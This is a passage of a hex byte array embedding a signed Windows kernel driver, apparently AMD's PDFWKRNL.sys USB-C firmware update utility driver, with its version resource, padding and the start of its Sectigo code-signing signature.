		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
		0x60, 0x60, 0x00, 0x00, 0xA8, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x03, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5F, 0x00, 0x56, 0x00, 0x45, 0x00,
		0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4F, 0x00, 0x4E, 0x00, 0x5F, 0x00, 0x49, 0x00, 0x4E, 0x00, 0x46, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBD, 0x04, 0xEF, 0xFE, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x04, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x03, 0x00, 0x00,
		0x01, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0xE4, 0x02, 0x00, 0x00, 0x01, 0x00, 0x31, 0x00,
		0x30, 0x00, 0x30, 0x00, 0x39, 0x00, 0x30, 0x00, 0x34, 0x00, 0x62, 0x00, 0x30, 0x00, 0x00, 0x00, 0x5A, 0x00, 0x1D, 0x00, 0x01, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x79, 0x00, 0x4E, 0x00, 0x61, 0x00,
		0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00, 0x64, 0x00, 0x76, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x65, 0x00, 0x64, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x20, 0x00, 0x44, 0x00,
		0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x2C, 0x00, 0x20, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x34, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00,
		0x65, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x2D, 0x00, 0x43, 0x00, 0x20, 0x00,
		0x50, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x44, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x79, 0x00, 0x20, 0x00, 0x46, 0x00, 0x69, 0x00, 0x72, 0x00, 0x6D, 0x00, 0x77, 0x00,
		0x61, 0x00, 0x72, 0x00, 0x65, 0x00, 0x20, 0x00, 0x55, 0x00, 0x70, 0x00, 0x64, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x20, 0x00, 0x55, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 0x20, 0x00, 0x44, 0x00,
		0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x28, 0x00, 0x04, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00,
		0x65, 0x00, 0x00, 0x00, 0x50, 0x00, 0x44, 0x00, 0x46, 0x00, 0x57, 0x00, 0x4B, 0x00, 0x52, 0x00, 0x4E, 0x00, 0x4C, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x00, 0x30, 0x00, 0x01, 0x00, 0x4C, 0x00,
		0x65, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00,
		0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x20, 0x00, 0x28, 0x00, 0x43, 0x00, 0x29, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x32, 0x00, 0x31, 0x00, 0x20, 0x00, 0x41, 0x00, 0x64, 0x00, 0x76, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x65, 0x00,
		0x64, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x20, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x2C, 0x00, 0x20, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x63, 0x00,
		0x2E, 0x00, 0x00, 0x00, 0x42, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x4F, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6D, 0x00,
		0x65, 0x00, 0x00, 0x00, 0x50, 0x00, 0x44, 0x00, 0x46, 0x00, 0x57, 0x00, 0x4B, 0x00, 0x52, 0x00, 0x4E, 0x00, 0x4C, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x00, 0x34, 0x00, 0x01, 0x00, 0x50, 0x00,
		0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x2D, 0x00, 0x43, 0x00, 0x20, 0x00, 0x50, 0x00, 0x6F, 0x00,
		0x77, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x44, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x79, 0x00, 0x20, 0x00, 0x46, 0x00, 0x69, 0x00, 0x72, 0x00, 0x6D, 0x00, 0x77, 0x00, 0x61, 0x00, 0x72, 0x00,
		0x65, 0x00, 0x20, 0x00, 0x55, 0x00, 0x70, 0x00, 0x64, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x20, 0x00, 0x55, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 0x20, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00,
		0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x04, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00,
		0x6E, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x10, 0xB0, 0x04,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x90, 0xA0, 0x98, 0xA0, 0xA0, 0xA0, 0xA8, 0xA0,
		0xB0, 0xA0, 0x98, 0xA1, 0xB0, 0xA1, 0xB8, 0xA1, 0xC0, 0xA1, 0x58, 0xA2, 0x60, 0xA2, 0x68, 0xA2, 0x70, 0xA2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x51, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x30, 0x82, 0x51, 0xAF, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02, 0xA0,
		0x82, 0x51, 0xA0, 0x30, 0x82, 0x51, 0x9C, 0x02, 0x01, 0x01, 0x31, 0x0F, 0x30, 0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0x30, 0x5C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01,
		0x04, 0xA0, 0x4E, 0x30, 0x4C, 0x30, 0x17, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0F, 0x30, 0x09, 0x03, 0x01, 0x00, 0xA0, 0x04, 0xA2, 0x02, 0x80, 0x00, 0x30, 0x31, 0x30, 0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01,
		0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0x04, 0x20, 0xFC, 0x23, 0xAB, 0xDC, 0xF9, 0x39, 0x28, 0xE1, 0xDB, 0x84, 0x01, 0xA7, 0xFF, 0x53, 0xC8, 0x6C, 0x85, 0x23, 0x0A, 0x86, 0x37, 0xC4, 0x16, 0x8F, 0x74, 0x34, 0x20, 0x8F, 0x9E, 0x8B, 0x5D,
		0xED, 0xA0, 0x82, 0x11, 0xA1, 0x30, 0x82, 0x05, 0x3A, 0x30, 0x82, 0x04, 0x22, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x10, 0x53, 0x50, 0x91, 0xE6, 0xCA, 0xB1, 0x3A, 0xF3, 0x93, 0xB5, 0x1E, 0xAD, 0x08, 0x25, 0xF6, 0x27, 0x30, 0x0D, 0x06, 0x09,
		0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x30, 0x7C, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x47, 0x42, 0x31, 0x1B, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x12, 0x47, 0x72, 0x65,
		0x61, 0x74, 0x65, 0x72, 0x20, 0x4D, 0x61, 0x6E, 0x63, 0x68, 0x65, 0x73, 0x74, 0x65, 0x72, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x53, 0x61, 0x6C, 0x66, 0x6F, 0x72, 0x64, 0x31, 0x18, 0x30, 0x16, 0x06, 0x03, 0x55,
		0x04, 0x0A, 0x13, 0x0F, 0x53, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x20, 0x4C, 0x69, 0x6D, 0x69, 0x74, 0x65, 0x64, 0x31, 0x24, 0x30, 0x22, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1B, 0x53, 0x65, 0x63, 0x74, 0x69, 0x67, 0x6F, 0x20, 0x52, 0x53,
		0x41, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x43, 0x41, 0x30, 0x1E, 0x17, 0x0D, 0x32, 0x31, 0x30, 0x35, 0x31, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A, 0x17, 0x0D, 0x32, 0x34, 0x30, 0x35,
		0x31, 0x30, 0x32, 0x33, 0x35, 0x39, 0x35, 0x39, 0x5A, 0x30, 0x81, 0x84, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x0C, 0x0A, 0x43, 0x61, 0x6C, 0x69,
		0x66, 0x6F, 0x72, 0x6E, 0x69, 0x61, 0x31, 0x14, 0x30, 0x12, 0x06, 0x03, 0x55, 0x04, 0x07, 0x0C, 0x0B, 0x53, 0x61, 0x6E, 0x74, 0x61, 0x20, 0x43, 0x6C, 0x61, 0x72, 0x61, 0x31, 0x24, 0x30, 0x22, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x0C, 0x1B, 0x41,
		0x64, 0x76, 0x61, 0x6E, 0x63, 0x65, 0x64, 0x20, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x20, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x31, 0x24, 0x30, 0x22, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0C, 0x1B, 0x41, 0x64, 0x76,
		0x61, 0x6E, 0x63, 0x65, 0x64, 0x20, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x20, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01,
		0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xB1, 0x7F, 0xFC, 0xF0, 0x8F, 0xAA, 0x24, 0x9C, 0x2F, 0x5C, 0x89, 0x25, 0xC3, 0x59, 0x64, 0xA2, 0x8B, 0xCD, 0xD3, 0x4A, 0xA9, 0x4A, 0x9E,
		0xE1, 0x7D, 0x1B, 0xE0, 0x5E, 0x6D, 0x80, 0xE2, 0x26, 0x52, 0x0D, 0xB0, 0x61, 0x00, 0x3B, 0xA8, 0x5E, 0xDA, 0x64, 0x02, 0x0D, 0x18, 0xE5, 0x3A, 0x1D, 0xE5, 0xEF, 0x93, 0x04, 0x7A, 0x9E, 0xAE, 0xB2, 0x13, 0x12, 0x9B, 0xCE, 0x98, 0xD4, 0xD9,
		0x71, 0x44, 0x96, 0xBF, 0x21, 0x0A, 0xD7, 0xB9, 0x66, 0x82, 0x90, 0x25, 0x05, 0xE9, 0x56, 0xE5, 0x70, 0xBE, 0x4D, 0xD0, 0xA7, 0xEA, 0x60, 0xA5, 0x58, 0x9B, 0x96, 0x23, 0x33, 0x20, 0x7E, 0x61, 0x13, 0x90, 0xFA, 0x81, 0xF4, 0x30, 0x14, 0x1B,
		0x33, 0xBD, 0x1B, 0x41, 0x7E, 0xE6, 0x66, 0x5B, 0xC7, 0x73, 0xC4, 0x4E, 0x7A, 0xBB, 0x86, 0x3C, 0xAB, 0x6C, 0x78, 0x01, 0xAB, 0xAD, 0x40, 0x17, 0xB8, 0x60, 0xB7, 0x8F, 0x83, 0x4C, 0x9D, 0x00, 0xB0, 0x6F, 0x0E, 0xC9, 0x39, 0x69, 0xE5, 0x94,
		0x12, 0xA8, 0x21, 0xE2, 0x9B, 0x30, 0xB3, 0x5C, 0x29, 0x7C, 0x07, 0x53, 0xAD, 0x60, 0xD2, 0x50, 0xAE, 0x59, 0x6F, 0x75, 0x2F, 0x43, 0x56, 0x56, 0x65, 0x21, 0xAA, 0x9C, 0xF7, 0x73, 0xB5, 0x36, 0x45, 0x41, 0xF8, 0xFF, 0x31, 0x59, 0xB2, 0x16,
		0x3F, 0xF8, 0xC2, 0xD5, 0xD2, 0x07, 0x8B, 0x26, 0xA6, 0x6E, 0xD1, 0x09, 0x91, 0xE6, 0x66, 0x52, 0xFC, 0xD3, 0xBF, 0x64, 0xF5, 0x34, 0xBF, 0x6B, 0x21, 0x26, 0x88, 0xDE, 0x94, 0xFE, 0x79, 0xE8, 0xDC, 0xCE, 0xB4, 0x8C, 0x8E, 0xDA, 0x6C, 0xAE,
